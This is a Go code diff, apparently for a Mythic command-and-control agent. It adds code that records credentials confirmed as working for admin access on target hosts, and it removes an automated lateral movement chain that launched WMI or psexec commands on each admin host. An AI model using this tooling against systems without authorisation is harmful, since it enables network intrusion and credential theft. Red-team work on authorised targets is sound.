@@ -195,7 +195,6 @@ func init() {
 			if !ok || responseText == "" || responseText == "[]" {
 				return response
 			}
-			// Parse JSON array of results, track admin-confirmed hosts
 			var results []struct {
 				Host   string `json:"host"`
 				Method string `json:"method"`
@@ -204,11 +203,51 @@ func init() {
 			if err := json.Unmarshal([]byte(responseText), &results); err != nil {
 				return response
 			}
+			var adminHosts []string
 			for _, r := range results {
 				if r.Admin {
 					createArtifact(processResponse.TaskData.Task.ID, "Network Connection",
 						fmt.Sprintf("Admin access confirmed: %s via %s", r.Host, r.Method))
+					adminHosts = append(adminHosts, r.Host)
 				}
+			}
+
+			if len(adminHosts) > 0 {
+				username, _ := processResponse.TaskData.Args.GetStringArg("username")
+				password, _ := processResponse.TaskData.Args.GetStringArg("password")
+				hash, _ := processResponse.TaskData.Args.GetStringArg("hash")
+				method, _ := processResponse.TaskData.Args.GetStringArg("method")
+
+				if username != "" && (password != "" || hash != "") {
+					account := username
+					realm := processResponse.TaskData.Callback.Host
+					if idx := strings.Index(account, "\\"); idx >= 0 {
+						realm = account[:idx]
+						account = account[idx+1:]
+					} else if idx := strings.Index(account, "@"); idx >= 0 {
+						realm = account[idx+1:]
+						account = account[:idx]
+					}
+
+					credType := "plaintext"
+					credential := password
+					comment := fmt.Sprintf("find-admin (admin on %s via %s)", strings.Join(adminHosts, ","), method)
+					if hash != "" {
+						credType = "hash"
+						credential = hash
+					}
+
+					registerCredentials(processResponse.TaskData.Task.ID,
+						[]mythicrpc.MythicRPCCredentialCreateCredentialData{{
+							CredentialType: credType,
+							Realm:          realm,
+							Account:        account,
+							Credential:     credential,
+							Comment:        comment,
+						}})
+				}
+				logOperationEvent(processResponse.TaskData.Task.ID,
+					fmt.Sprintf("[ADMIN ACCESS] %s has admin on %d host(s): %s", username, len(adminHosts), strings.Join(adminHosts, ", ")), true)
 			}
 			return response
 		},
@@ -314,192 +353,3 @@ func init() {
 	})
 }
 
-// autoMoveFindDone handles find-admin completion in the lateral movement chain.
-// Parses admin hosts from find-admin results, creates lateral movement subtasks.
-func autoMoveFindDone(taskData *agentstructs.PTTaskMessageAllData, subtaskData *agentstructs.PTTaskMessageAllData, groupName *agentstructs.SubtaskGroupName) agentstructs.PTTaskCompletionFunctionMessageResponse {
-	response := agentstructs.PTTaskCompletionFunctionMessageResponse{
-		TaskID:  taskData.Task.ID,
-		Success: true,
-	}
-
-	// Get find-admin results
-	responseText := getSubtaskResponses(subtaskData.Task.ID)
-	if responseText == "" {
-		completed := true
-		response.Completed = &completed
-		msg := "Lateral Movement Chain: find-admin returned no results"
-		response.Stdout = &msg
-		mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
-			TaskID: taskData.Task.ID, Response: []byte(msg),
-		})
-		return response
-	}
-
-	// Parse JSON results to find hosts with admin=true
-	var adminHosts []string
-	var results []struct {
-		Host   string `json:"host"`
-		Admin  bool   `json:"admin"`
-		Method string `json:"method"`
-	}
-	if err := json.Unmarshal([]byte(responseText), &results); err != nil {
-		// Try line-by-line NDJSON
-		for _, line := range strings.Split(responseText, "\n") {
-			line = strings.TrimSpace(line)
-			if line == "" {
-				continue
-			}
-			var single struct {
-				Host  string `json:"host"`
-				Admin bool   `json:"admin"`
-			}
-			if err := json.Unmarshal([]byte(line), &single); err == nil && single.Admin {
-				adminHosts = append(adminHosts, single.Host)
-			}
-		}
-	} else {
-		for _, r := range results {
-			if r.Admin {
-				adminHosts = append(adminHosts, r.Host)
-			}
-		}
-	}
-
-	// Deduplicate hosts
-	hostSet := map[string]bool{}
-	var uniqueHosts []string
-	for _, h := range adminHosts {
-		if !hostSet[h] {
-			hostSet[h] = true
-			uniqueHosts = append(uniqueHosts, h)
-		}
-	}
-
-	mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
-		TaskID:   taskData.Task.ID,
-		Response: []byte(fmt.Sprintf("[Step 1/2] Admin sweep complete. Found %d admin hosts: %s", len(uniqueHosts), strings.Join(uniqueHosts, ", "))),
-	})
-
-	if len(uniqueHosts) == 0 {
-		completed := true
-		response.Completed = &completed
-		msg := "Lateral Movement Chain complete: no admin hosts found"
-		response.Stdout = &msg
-		mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
-			TaskID: taskData.Task.ID, Response: []byte(msg),
-		})
-		return response
-	}
-
-	// Get chain context from parent task
-	// Use extractChainContext to handle Mythic appending extra lines to Stdout
-	chainCtx := extractChainContext(taskData.Task.Stdout)
-
-	lateralMethod := chainCtx["lateral_method"]
-	lateralCmd := chainCtx["lateral_command"]
-	if lateralCmd == "" {
-		lateralCmd = "whoami /all"
-	}
-
-	// Step 2: Create lateral movement subtasks for each admin host
-	var tasks []mythicrpc.MythicRPCTaskCreateSubtaskGroupTasks
-	groupCallback := "autoMoveLateralDone"
-
-	for _, host := range uniqueHosts {
-		var params map[string]interface{}
-		switch lateralMethod {
-		case "wmi":
-			params = map[string]interface{}{
-				"host":    host,
-				"action":  "exec",
-				"command": lateralCmd,
-			}
-			if chainCtx["username"] != "" {
-				params["username"] = chainCtx["username"]
-			}
-			if chainCtx["password"] != "" {
-				params["password"] = chainCtx["password"]
-			}
-			if chainCtx["hash"] != "" {
-				params["hash"] = chainCtx["hash"]
-			}
-		default: // psexec
-			params = map[string]interface{}{
-				"host":    host,
-				"command": lateralCmd,
-			}
-		}
-
-		paramsJSON, _ := json.Marshal(params)
-		tasks = append(tasks, mythicrpc.MythicRPCTaskCreateSubtaskGroupTasks{
-			CommandName: lateralMethod,
-			Params:      string(paramsJSON),
-		})
-	}
-
-	_, err := mythicrpc.SendMythicRPCTaskCreateSubtaskGroup(
-		mythicrpc.MythicRPCTaskCreateSubtaskGroupMessage{
-			TaskID:                taskData.Task.ID,
-			GroupName:             "lateral_movement_chain",
-			GroupCallbackFunction: &groupCallback,
-			Tasks:                 tasks,
-		},
-	)
-	if err != nil {
-		completed := true
-		response.Completed = &completed
-		msg := fmt.Sprintf("Lateral Movement Chain: failed to create lateral movement subtasks: %s", err.Error())
-		response.Stderr = &msg
-		return response
-	}
-
-	mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
-		TaskID:   taskData.Task.ID,
-		Response: []byte(fmt.Sprintf("[Step 2/2] Created %d %s subtasks for admin hosts.", len(tasks), lateralMethod)),
-	})
-
-	return response
-}
-
-// autoMoveLateralDone handles completion of all lateral movement subtasks.
-func autoMoveLateralDone(taskData *agentstructs.PTTaskMessageAllData, subtaskData *agentstructs.PTTaskMessageAllData, groupName *agentstructs.SubtaskGroupName) agentstructs.PTTaskCompletionFunctionMessageResponse {
-	response := agentstructs.PTTaskCompletionFunctionMessageResponse{
-		TaskID:  taskData.Task.ID,
-		Success: true,
-	}
-
-	// Aggregate all subtask results
-	parentID := taskData.Task.ID
-	searchResult, err := mythicrpc.SendMythicRPCTaskSearch(mythicrpc.MythicRPCTaskSearchMessage{
-		TaskID:             parentID,
-		SearchParentTaskID: &parentID,
-	})
-
-	summary := "=== Lateral Movement Chain Complete ===\n"
-	if err == nil && searchResult.Success {
-		successCount := 0
-		errorCount := 0
-		for _, task := range searchResult.Tasks {
-			if task.Status == "error" {
-				errorCount++
-			} else if task.Completed {
-				successCount++
-			}
-			summary += fmt.Sprintf("[%s] %s %s\n", task.Status, task.CommandName, task.DisplayParams)
-		}
-		summary += fmt.Sprintf("\nTotal: %d subtasks (%d success, %d errors)\n", len(searchResult.Tasks), successCount, errorCount)
-	} else {
-		summary += "Could not retrieve subtask details.\n"
-	}
-
-	completed := true
-	response.Completed = &completed
-	response.Stdout = &summary
-
-	mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
-		TaskID:   parentID,
-		Response: []byte(summary),
-	})
-
-	return response
-}
